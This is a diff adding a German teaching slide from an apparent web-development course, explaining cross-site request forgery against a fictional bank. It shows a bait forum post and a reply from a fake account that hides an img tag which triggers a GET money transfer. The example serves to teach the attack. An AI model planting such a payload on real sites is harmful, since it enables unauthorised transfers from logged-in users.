@@ -1,0 +1,27 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="utf-8" />
+<title>WebApplications mit HTML5, CSS3 und JavaScript</title>
+<base href="../../" />
+</head>
+<body><h1>Beispiel (34)</h1>
+<p>Manche US-Banken erlauben den Transfer über die URL, z.B. über folgenden Link</p>
+<pre lang="html">
+&lt;a href=&quot;http://widelyusedbank.example.com?function=transfer&amp;amount=1000&amp;toaccountnumber=23234554333&amp;from=checking&quot;&gt;Hier klicken!&lt;/a&gt;
+</pre>
+<p>Wer macht denn sowas? Leider ist die Antwort hierauf: Zu viele...</p>
+<p>Wie können wir dieses lasche Verhalten nun ausnutzen? Wir gehen auf eine rießige Seite, die uns Kommentare zuläßt, welche Links beinhalten dürfen. Wir erstellen folgenden Post:</p>
+<pre lang="html">
+Wusstet ihr das man als Kunde von &lt;i&gt;widelyusedbank&lt;/i&gt; &lt;strong&gt;immer&lt;/strong&gt; eine Kontonummer erhält, welche die Quersumme 30 hat?!
+Schauts euch selbst an unter &lt;a href=&quot;http://widelyusedbank.example.com&quot;&gt;widelyusedbank website&lt;/a&gt;.
+</pre>
+<p>Danach erstellt man mit einem zweiten (gefälschten) Account eine Antwort auf den ursprünglichen Beitrag. Diese könnte folgendermaßen aussehen:</p>
+<pre lang="html">
+OMG das stimmt ja wirklich! Ziemlich seltsam...
+&lt;img src=&quot;http://widelyusedbank.example.com?function=transfer&amp;amount=1000&amp;toaccountnumber=23234554333&amp;from=checking&quot; /&gt;
+</pre>
+<p>Der Trick hier besteht darin, dass Kunden der Bank sich einloggen und danach nochmal den Kommentar lesen wollen. Dieser ist nun aber mit einem bösen Bild versehen, welcher den
+Transfer durchführt. (Zum Glück sind die mir bekannten deutschen Banken hier viel sicherer aufgestellt - allein schon wg. iTAN etc.)</p>
+</body>
+</html>
